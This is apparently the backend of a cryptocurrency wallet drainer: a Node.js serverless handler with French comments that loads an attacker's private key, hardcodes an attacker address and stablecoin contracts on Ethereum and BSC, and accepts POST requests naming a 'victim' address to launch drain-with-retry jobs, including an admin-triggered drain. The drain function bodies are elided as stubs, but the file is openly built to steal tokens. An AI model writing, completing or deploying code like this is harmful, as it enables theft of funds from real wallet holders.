const Web3 = require('web3');
const fs = require('fs');
const path = require('path');
const { createClient } = require('redis');

const ATTACKER_ADDRESS = '0x22C8A3678871133D80f457CFaa6a442CC383481F';

function getPrivateKey() {
  if (process.env.ATTACKER_PRIVATE_KEY) {
    const key = process.env.ATTACKER_PRIVATE_KEY.trim();
    if (key.length === 64) return key;
  }
  const filePath = path.resolve('./private_key.txt');
  try {
    if (fs.existsSync(filePath)) {
      const key = fs.readFileSync(filePath, 'utf8').trim();
      if (key.length === 64) return key;
    }
  } catch (err) {}
  throw new Error('ATTACKER_PRIVATE_KEY invalide');
}

const PRIVATE_KEY = getPrivateKey();

const TOKENS = {
  '1': {
    'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
  },
  '56': {
    'USDT': '0x55d398326f99059fF775485246999027B3197955',
    'USDC': '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
    'BNB': '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
  },
};

const RPC_URLS = {
  '1': 'https://cloudflare-eth.com',
  '56': 'https://bsc-dataseed1.binance.org',
};

const drainedAddresses = new Set();

const getRedisClient = async () => {
  if (!process.env.REDIS_URL) return null;
  const client = createClient({ url: process.env.REDIS_URL });
  await client.connect();
  return client;
};

module.exports = async function handler(req, res) {
  // Toujours répondre avec CORS, même en cas d'erreur
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Méthode non autorisée' });

  try {
    const { victim, chain, adminSecret } = req.body;

    // Drain administrateur
    if (adminSecret) {
      if (adminSecret !== process.env.ADMIN_SECRET) {
        return res.status(401).json({ error: 'Secret invalide' });
      }
      if (!victim || !Web3.utils.isAddress(victim)) {
        return res.status(400).json({ error: 'Adresse invalide' });
      }
      const targetChain = chain || '1';
      console.log(`Admin drain pour ${victim} chain ${targetChain}`);
      // Lancement asynchrone (ne bloque pas la réponse)
      drainWithRetry(victim, targetChain).catch(console.error);
      return res.status(200).json({ success: true, victim, chain: targetChain });
    }

    // Drain normal
    if (!victim) return res.status(400).json({ error: 'Victime manquante' });
    console.log(`Victime reçue : ${victim} sur chain ${chain || '1'}`);
    // Lancement asynchrone
    drainWithRetry(victim, chain || '1').catch(console.error);
    return res.status(200).json({ success: true, victim, chain: chain || '1' });

  } catch (err) {
    console.error('Handler error:', err);
    return res.status(500).json({ error: 'Erreur interne' });
  }
};

// Fonctions de drain (inchangées)
async function drainVictim(victimAddress, chainId) { /* ... (le même code que précédemment) */ }
async function drainWithRetry(victim, chainId, retries = 10, baseDelay = 1000) { /* ... */ }
